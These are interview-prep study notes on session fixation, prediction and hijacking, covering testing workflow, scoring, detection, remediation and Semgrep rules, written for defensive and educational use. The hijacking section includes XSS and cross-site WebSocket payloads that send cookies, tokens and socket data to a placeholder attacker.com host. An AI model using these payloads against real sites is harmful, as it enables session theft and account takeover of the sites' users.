# Session Management Vulnerabilities — Interview Prep Notes
*Session Fixation (SF) | Session Prediction (SP) | Session Hijacking (SH)*

---

## 1. Logical Description

- **SF** — attacker forces/plants a known session ID on victim *before* login; app fails to rotate ID on auth → attacker's pre-known ID becomes valid.
- **SP** — session token generation weak/predictable (sequential, low-entropy, timestamp/derivable) → attacker computes valid token, no victim needed.
- **SH** — theft/reuse of an *already-valid* session token (XSS, sniffing, leakage, replay) — post-issuance compromise.
- Siblings, not parent-child (common misconception: SH ≠ umbrella over SF/SP). Narrow/technical definitions treat all 3 as parallel.
- Unifying root cause: session ID not treated as a security-critical, single-purpose, server-controlled credential.

---

## 2. OWASP / CWE Mapping

- **OWASP 2021**: A07:2021 – Identification and Authentication Failures (all three)
- **CWE**:
  - SF → CWE-384 (Session Fixation)
  - SP → CWE-330 (Insufficiently Random Values), CWE-338 (weak PRNG)
  - SH → CWE-294 (replay-adjacent), CWE-1004 (missing HttpOnly), CWE-614 (missing Secure), CWE-522 (insufficiently protected credentials)

---

## 3. Variants

**SF:**
- URL-based (`?PHPSESSID=`)
- Cookie-based (XSS/meta-tag/subdomain-set)
- Hidden form field
- Cross-subdomain fixation

**SP:**
- Sequential/incremental IDs
- Time-based/weak PRNG seed
- Encoded/reversible tokens (base64 of predictable data)
- Insufficient entropy (short tokens)
- Algorithmic weakness (deterministic "randomization")

**SH:**
- XSS-based token theft (cookie/localStorage)
- Network sniffing (HTTP, rogue Wi-Fi)
- Session-in-URL / Referer leakage / log leakage
- MITM / SSL stripping
- Malware/local token theft
- Token in localStorage/sessionStorage misuse
- CSWSH (Cross-Site WebSocket Hijacking) — no Origin validation
- Session Replay (adjacent) — reuse post-logout/expiry

---

## 4. Attack Surface / Entry Points

**SF:**
- Login endpoints w/o rotation
- URL-rewriting session configs (legacy PHP/J2EE)
- Any endpoint accepting session ID as param/header/hidden field
- Cross-domain cookie scope (`Domain=.example.com`)
- SSO/OAuth callback flows
- Password reset/recovery flows
- Multi-step auth (MFA) — gap between step 1 and step 2

**SP:**
- Token generation logic (code-level surface)
- Any session-issuing endpoint (login, guest, reset, API key)
- Load balancer / multi-node token generation
- Custom/home-grown session middleware
- Shared RNG reused for reset tokens/CSRF/API keys

**SH:**
- Unencrypted HTTP endpoints, missing HSTS
- Missing Secure/HttpOnly flags
- Any XSS injection point (reflected/stored/DOM)
- localStorage/sessionStorage usage
- 3rd-party scripts/supply chain
- Referer leakage, access/analytics logs
- WebSocket handshake w/o Origin check
- GraphQL subscriptions over WS
- Mobile app local storage/logs

---

## 5. Testing Workflow (Manual + Burp + ZAP + Nuclei)

### Phase 0 — Session Mechanics Recon (feeds all 3)
- Identify mechanism (cookie/URL/JWT/header)
- Locate all session-issuing endpoints
- Capture baseline pre-auth token
- Map cookie flags on every Set-Cookie
- **Burp**: Proxy→HTTP History (filter Set-Cookie), Site Map, Logger++
- **ZAP**: Persistence/Sites tree, HTTP Sessions tab (dedicated token tracker)
- **Nuclei**: not useful (no crawl capability)

### Phase 1 — Fixation
- Capture pre-login ID (A) → login → capture post-login ID (B) → diff
- If A==B → confirm exploit: attacker sets ID, sends link, victim logs in, attacker reuses ID
- Repeat across: standard login, MFA (each step), SSO callback, password reset
- Test forced session acceptance (send arbitrary ID pre-auth)
- **Manual**: capture/replay cookie across flow
- **Burp**: Repeater (hold ID const, diff pre/post)
- **ZAP**: HTTP Sessions tab (native pre/post diff), Manual Request Editor (forced ID test)
- **Nuclei**: weak fit; possible via custom multi-step `http` template w/ `cookie-reuse: true`
- **Payloads**: `?PHPSESSID=ATTACKER_ID`, XSS cookie set (`document.cookie=...`), meta-tag injection, hidden field tamper, cross-subdomain cookie plant

### Phase 2 — Prediction
- Bulk-collect 100–10k+ tokens
- Decode (base64/hex) → inspect structure
- Entropy analysis, time-correlation
- Forge next token → submit unauth → confirm accepted
- Cross-check reset/CSRF/API tokens for shared generator
- **Manual**: script repeated login/register, decode manually
- **Burp**: **Sequencer** (primary tool — entropy/chi-square), Decoder, Repeater (forge submit)
- **ZAP**: no Sequencer equivalent (Burp's clear edge); Fuzzer for bulk submission once pattern known
- **Nuclei**: good only for automating exploitation *after* pattern known (DSL/wordlist), not discovery
- **Payloads**: `sess_1003` (sequential guess), `MD5(username+est_timestamp)`, decode→modify→re-encode, Intruder brute-force sweep

### Phase 3 — Hijacking
- Transport: force HTTP fallback, confirm HSTS, verify Secure flag
- Cookie flags: HttpOnly/Secure/SameSite audit
- XSS chain: find XSS → exfil document.cookie (if no HttpOnly) or localStorage token
- Leakage: Referer header, Referrer-Policy, JS bundle grep for localStorage usage, logs
- Concurrent session/replay: reuse token cross-device, replay after logout
- WebSocket/CSWSH: check Origin validation
- **Manual**: browser dev tools, curl over HTTP, manual XSS PoC
- **Burp**: HTTP History (flag audit), Repeater (HTTP fallback test), Scanner (Pro — auto-flags missing flags), DOM Invader (XSS), WebSockets history tab
- **ZAP**: Passive Scanner (auto-alerts: No HttpOnly/No Secure/No SameSite — fast, always-on), Active Scanner, HTTP Sessions tab (multi-context concurrent session test), WebSocket tab
- **Nuclei**: **strong fit** — community templates (`http/misconfiguration/`) for missing flags, HSTS; bulk-scan via gau/Katana-fed inventory
- **Payloads**:
```html
<script>fetch('https://attacker.com/log?c='+document.cookie)</script>
<img src=x onerror="fetch('https://attacker.com/log?c='+document.cookie)">
<script>fetch('https://attacker.com/log?t='+localStorage.getItem('authToken'))</script>
```
CSWSH:
```html
<script>
var ws = new WebSocket("wss://target.com/socket");
ws.onopen = () => ws.send("steal");
ws.onmessage = (e) => fetch('https://attacker.com/log?d='+e.data);
</script>
```

**Tool-fit summary table:**

| Phase | Burp | ZAP | Nuclei |
|---|---|---|---|
| Recon | Strong | Strong | N/A |
| Fixation | Strong (Repeater) | Strong (HTTP Sessions, best fit) | Weak |
| Prediction | Best (Sequencer) | Weak | Exploit automation only |
| Hijacking | Strong (manual+Scanner) | Strong (Passive Scanner) | Best for bulk flag sweeps |

**Pipeline**: Nuclei bulk sweep across inventory → Burp/ZAP manual stateful confirm on flagged targets.

---

## 6. Evidence to Collect

**SF**: pre/post login ID diff screenshot; two-browser full takeover PoC; server acceptance of client-supplied ID; Set-Cookie absence/no-rotation proof

**SP**: Sequencer entropy report (low bits); token sample table showing pattern; **forged token accepted** (critical — proves exploit not just weakness); time-to-predict metric

**SH**: captured token at attacker listener (Collaborator/webhook); full chain screenshot (inject→exfil→replay→access); cookie flag audit table; HTTP cleartext capture; post-logout replay success (timestamp proof); CSWSH handshake missing Origin + successful cross-origin connect

**Rule**: weakness present ≠ confirmed exploit — always show the full attacker-side loop.

---

## 7. Good PoC Shape

- **SF**: attacker browser sets ID → victim browser logs in via link → attacker browser refreshes → authenticated as victim (two-browser demo)
- **SP**: compute token independently (not intercepted) → submit → gain access to another identity's data
- **SH**: inject payload → victim executes → token received at attacker endpoint → attacker replays → full session takeover screenshot sequence

---

## 8. Attack Chains

**SF chain**: no rotation → craft link → deliver → victim auths → attacker owns session → pivot to IDOR / privilege escalation (if victim is admin) / persistent backdoor (no expiry/binding)

**SP chain**: collect tokens → entropy break → algorithm reversed → forge token(s) → mass account takeover → pivot to IDOR at scale / password-reset & MFA bypass (shared RNG) / API key abuse

**SH chain**: XSS found → inject → exfil (cookie/localStorage) → replay → pivot to IDOR / CSRF-ride (if SameSite also missing) / privilege escalation (admin visits stored XSS) / CSWSH → live data exfil / supply-chain mass compromise

**Cross-chain combos:**
- Prediction feeds Fixation (predicted ID used as fixation payload)
- Hijacking discovers Prediction (stolen token studied → pattern reversed)
- **Any of 3 → IDOR → mass data breach** (session = door, IDOR = hallway to every room) — key narrative given systemic IDOR context
- Session compromise → CSRF → state-changing actions → full account lock-out (password/email change)

---

## 9. False Positives

**SF**: framework rotates ID but preserves session data (diff actual value, not just visual similarity); LB sticky sessions mimic persistence; stateless JWT apps — rotation check doesn't apply same way

**SP**: cosmetic UI counter ≠ actual token; short sampling window falsely suggests (non-)randomness — need large sample (10k+); UUIDv1 looks structured but not trivially computable — don't overstate severity

**SH**: impossible-travel alerts from VPN/corporate proxy/mobile NAT; same-session diff User-Agent = browser update or legit multi-device (check app's session model); token in logs ≠ automatically exploitable (depends on log exposure); missing HttpOnly alone ≠ confirmed hijack (need working XSS)

---

## 10. Prerequisites

**SF**: deliver link/payload to victim; server fails to rotate; **victim interaction required** (click + login); cookie-fixation needs XSS or sibling-subdomain control; no attacker creds needed

**SP**: ability to collect token sample; computational/analysis capability; **no victim interaction**; no creds; time/request budget (rate limiting as partial mitigant)

**SH**: 
- XSS vector: injectable point + HttpOnly absent (or storage misuse)
- Sniffing/MITM: network position + HTTP/missing Secure
- Leakage: token-in-URL + access to leak destination
- Replay: captured token + no server-side invalidation on logout
- CSWSH: attacker-hosted page + missing Origin validation

---

## 11. Attacker Gains

**SF**: full session takeover, zero cred theft; access = victim's privilege level; persistence if no expiry; no crypto-breaking needed

**SP**: forge arbitrary sessions on demand; **mass account takeover** (not victim-limited); target specific known users if identity embedded in token; extends to reset tokens/API keys if shared generator

**SH**: takeover of **already-live, already-privileged** session — highest immediate value; opportunistic (mid-transaction); mass compromise if stored XSS; real-time data streams via CSWSH; post-logout replay proves systemic lifecycle failure (scored higher)

**Comparative:**

| | Victim interaction | Skill needed | Scalability | Gain timing |
|---|---|---|---|---|
| SF | Yes | Low | One victim (unless XSS-delivered) | Future (waits for login) |
| SP | No | Medium | High | On-demand |
| SH | Varies | Varies | Varies by vector | Immediate |

---

## 12. CIA Impact Table

| Vuln | Confidentiality | Integrity | Availability |
|---|---|---|---|
| **SF** | High — full read access post-auth | High — state-changing actions as victim | Low/None — indirect only (lockout via email/pwd change) |
| **SP** | High — scale multiplies (many accounts) | High — same, at scale | Low — indirect (mass forged-login triggers lockout policy = DoS) |
| **SH** | High — live session, immediate | High — real-time privileged actions | Low/Medium — Medium if admin session or persistent replay access |

**Scope note**: all three often trigger CVSS Scope Change (S:C) when compromised session is higher-privileged than attacker's own level.

---

## 13. CVSS (generic baseline)

| Vuln | Vector | Score | Severity |
|---|---|---|---|
| SF | `AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N` | 7.6 | High |
| SP | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` | 8.6 | High |
| SH (XSS-chain) | `AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:L` | 9.3 | Critical |
| SH (MITM/sniffing) | `AV:A/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N` | 6.8 | Medium |

- SP > SF baseline: no UI requirement
- SH-XSS highest: Scope Change (low-priv XSS → high-priv admin) + immediate live access
- SH-MITM lower: AV:A + AC:H (network position needed)
- Real scoring must adjust for account privilege, MFA presence, IDOR-chaining (document as narrative addendum — CVSS doesn't natively score chains)

---

## 14. Business Impact (Financial App Context)

| Vuln | Business Impact | Regulatory |
|---|---|---|
| **SF** | Account takeover → fraud/unauthorized txns; limited to targeted individuals unless mass-phished | GDPR: reportable if PII exposed. PCI-DSS Req 6.2/8. HIPAA if PHI |
| **SP** | Mass account compromise, bot-driven automated exploitation, large-scale fraud/scraping | GDPR Art 33/34 — likely mandatory notification (scale). PCI-DSS Req 6.2 direct failure. HIPAA mass PHI = high fines |
| **SH** | Highest per-incident severity — real-time fraud (mid-transaction), full app compromise if admin session hijacked | GDPR breach notification + higher scrutiny if exfil proven. PCI-DSS 6.5.10 + 6.5.7 (if XSS-chained). HIPAA §164.312 access control failure |

**Composite risk**: chaining into systemic IDOR reclassifies from single-account to mass PII exposure — strongest narrative for regulatory/exec reporting; CVSS alone understates this, needs narrative business-impact section.

---

## 15. IOCs / Detection Signals

**SF**: same session ID pre/post-auth in logs; session ID in request before server issued one; multiple accounts under same session ID over time; login spike referencing fixed/shared token

**SP**: sequential/near-sequential IDs in traffic; rapid incrementing session guesses; session activated with no "created" log entry (successful prediction); decodable structured tokens (recon-time signal)

**SH**: same session ID from multiple IPs/geo (impossible travel); same session diff User-Agent mid-session; privilege-consistent but behaviorally anomalous activity (bulk export); activity continuing after logout; Referer/logs showing leaked tokens; WAF/IDS logs showing cookie-exfil XSS attempts

---

## 16. Root Cause (Code Logic)

**SF** — session treated as reusable object across trust boundary, not regenerated:
```
function login(request, response):
    session = getOrCreateSession(request.cookies.sessionId)  // honors client-supplied ID
    if validateCredentials(...):
        session.authenticated = true
        // NO regeneration
```

**SP** — weak/predictable generation:
```
sessionId = globalCounter++                          // sequential
sessionId = new Random(currentTimestamp()).next()     // weak PRNG, predictable seed
sessionId = MD5(username + currentTimestamp())        // derivable from known inputs
```

**SH** — storage/transport/lifecycle gaps:
```
localStorage.setItem('authToken', token)              // JS-readable = XSS-readable
Set-Cookie: session=<token>; Path=/                    // missing HttpOnly/Secure/SameSite
// logout clears client cookie only, JWT remains valid server-side (no revocation store)
```

**Unifying principle**: server fails to treat session ID as security-critical, single-purpose, server-generated, revocable credential.

---

## 17. Remediation / Secure Coding

**SF**:
```
function login(request, response):
    invalidate(request.session)              // kill pre-auth session
    newSession = createSession()               // fresh, CSPRNG ID
    newSession.authenticated = true
    response.setCookie(newSession.id, HttpOnly, Secure, SameSite=Strict)
```
- Regenerate on: login, MFA completion, privilege change, password reset
- Never accept client-supplied session ID
- Use framework-native `session.regenerate()`

**SP**:
```
sessionId = CSPRNG.generateBytes(256_bits)   // crypto.randomBytes / SecureRandom / os.urandom
encodedId = base64url(sessionId)
```
- Min 128-bit entropy (256 preferred)
- CSPRNG only, never Math.random()/rand()/time-seeded
- No derivation from attacker/user-knowable data
- Same standard applied to reset/CSRF/API tokens

**SH**:
```
Set-Cookie: session=<token>; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=3600
Strict-Transport-Security: max-age=31536000; includeSubDomains
```
```
function logout(request, response):
    revocationStore.add(extractJTI(token), expiresAt)   // kill switch for stateless JWT
    response.clearCookie('session')
```
- Framework-level default cookie flags (middleware, not per-route)
- Never store tokens in localStorage/sessionStorage — HttpOnly cookie or short-lived access + HttpOnly refresh pattern
- CSP to reduce XSS surface upstream
- Origin validation on WS handshakes

---

## 18. Compensating Controls (if root fix delayed)

**SF**: session-to-IP binding (soft signal), session-to-UA binding, short idle timeout, WAF rule blocking session-ID-in-URL

**SP**: rate limiting on session-consuming endpoints, account lockout/anomaly detection on repeated failed validations, monitoring sequential-guess patterns, token format obfuscation (temporary only)

**SH**: anomaly-based session monitoring (impossible travel, fingerprint mismatch), re-authentication for sensitive actions (fund transfer, email/pwd change), short absolute session timeout, WAF/CDN HTTPS-only + HSTS preload backstop

---

## 19. Repeated Occurrence — SDLC Signal

- Indicates session handling is **hand-rolled per team/product** rather than centralized — same failure mode as systemic IDOR
- Suggests missing framework-default enforcement (cookie flags, regeneration) and no shared secure-session library
- Signals gap in secure code review checklist for auth-flow PRs specifically
- Suggests SAST not yet covering auth/session taint sources — upstream control gap, not just isolated dev mistakes
- Points to lack of standardized CSPRNG usage policy across codebases

---

## 20. Upstream Prevention (SAST/Design)

**Detectability**: SP & SH strong SAST fit (pattern-matchable); SF weak/moderate (needs flow context) — better as targeted rule + manual checklist.

**SP — Semgrep (weak PRNG near session vars), taint-mode:**
```yaml
rules:
  - id: weak-rng-session-token
    mode: taint
    pattern-sources:
      - pattern: Math.random(...)
    pattern-sinks:
      - metavariable-regex:
          metavariable: $VAR
          regex: (?i)(session|token|sid|auth|csrf|reset|verif)
    metadata:
      cwe: "CWE-330"
```
- Cross-language: Java `java.util.Random` vs `SecureRandom`; PHP `rand()`/`mt_rand()` vs `random_bytes()`; Go `math/rand` vs `crypto/rand`

**SH — Semgrep (missing cookie flags):**
```yaml
rules:
  - id: cookie-missing-httponly
    patterns:
      - pattern: res.cookie($NAME, $VAL, {...})
      - pattern-not: res.cookie($NAME, $VAL, {..., httpOnly: true, ...})
      - metavariable-regex:
          metavariable: $NAME
          regex: (?i)(session|sid|auth|token)
    metadata:
      cwe: "CWE-1004"
```
(same pattern for Secure/CWE-614, SameSite; plus localStorage/sessionStorage token anti-pattern rule, CWE-522)

**SF — targeted, framework-specific (higher FP, stage as audit-only):**
```yaml
rules:
  - id: express-session-no-regenerate-on-login
    patterns:
      - pattern: function $LOGIN($REQ, $RES) { ... }
      - metavariable-regex:
          metavariable: $LOGIN
          regex: (?i)(login|signin|authenticate)
      - pattern-not: |
          function $LOGIN($REQ, $RES) { ... $REQ.session.regenerate(...) ... }
    metadata:
      cwe: "CWE-384"
```
- Better handled via CodeQL data-flow query (trace session ID equality across request-entry vs response-exit at auth boundary) than Semgrep syntactic match

**Staged rollout** (mirrors IDOR pipeline): Stage 1 audit-only (baseline noise) → Stage 2 warn-on-PR (high-confidence rules) → Stage 3 block-on-PR (proven low-FP: weak PRNG, missing HttpOnly/Secure); Fixation rule stays audit-only longer.

**Shared library angle**: provide `secureLogin()` / `secureCookieSet()` wrapper in shared lib; SAST flags any raw `res.cookie()`/`Math.random()` usage outside approved wrapper — lower FP, higher precision than inline config inspection.

---

## 21. Sample Triage Response

> "Confirmed [Fixation/Prediction/Hijacking] on [endpoint]. Verified full attacker-side impact: [session ID unchanged pre/post-auth and reused to access victim account / forged token accepted granting unauthorized access / stolen token replayed for live session takeover]. Root cause: [no session regeneration on auth / weak token entropy — CSPRNG not used / missing HttpOnly+Secure flags enabling XSS-based exfiltration]. CVSS: [vector] — [score] ([severity]). Business impact: potential account takeover affecting [scope — single user / mass, if chainable to IDOR]. Recommend prioritizing per [SLA tier] given [live exploitability / regulatory exposure]. Chained impact assessed: [yes/no — e.g., IDOR pivot confirmed]."

---

## 22. Sample Developer Remediation Note

> "**Finding**: [SF/SP/SH] on [component]. **Issue**: [session ID not regenerated post-login / Math.random() used for session token generation / session cookie missing HttpOnly+Secure flags]. **Fix**: [call session.regenerate() immediately after successful auth, before setting authenticated flag / replace with crypto.randomBytes(32) or equivalent CSPRNG, minimum 128-bit entropy / set cookie via Set-Cookie header with HttpOnly; Secure; SameSite=Strict]. **Reference**: use shared `secureSessionLib` wrapper — do not implement session logic inline. **Retest**: verify session ID differs pre/post-login (or) run token through Sequencer for entropy confirmation (or) confirm document.cookie inaccessible via test XSS payload post-fix."

---

## 23. Real-World Reference Points

- **SF**: classic PayPal/many J2EE-era apps — URL-based `jsessionid` fixation was a widespread early-2000s finding class; frequently cited in OWASP Testing Guide as canonical example
- **SP**: historic PHP `session.entropy_length` misconfigurations; early web app frameworks using `mt_rand()`/timestamp-seeded session IDs — common CWE-330 bug bounty class on custom auth implementations
- **SH**: Firesheep (2010) — popularized HTTP session sniffing over open Wi-Fi (cookie theft without Secure/HTTPS), directly drove industry-wide HTTPS-everywhere + Secure flag adoption
- **CSWSH**: Slack and various chat/real-time platforms have had historical bug bounty reports around WebSocket Origin validation gaps enabling cross-site session riding
- *(Recommend pulling 1–2 specific recent HackerOne/Bugcrowd disclosed reports matching your target industry — session-fixation/prediction reports are less common in modern frameworks than hijacking/XSS-chain reports, since mature frameworks handle rotation/entropy by default; hijacking via XSS remains the most frequently disclosed of the three in current bounty programs)*

---
*End of notes — Session Management (A07:2021)*
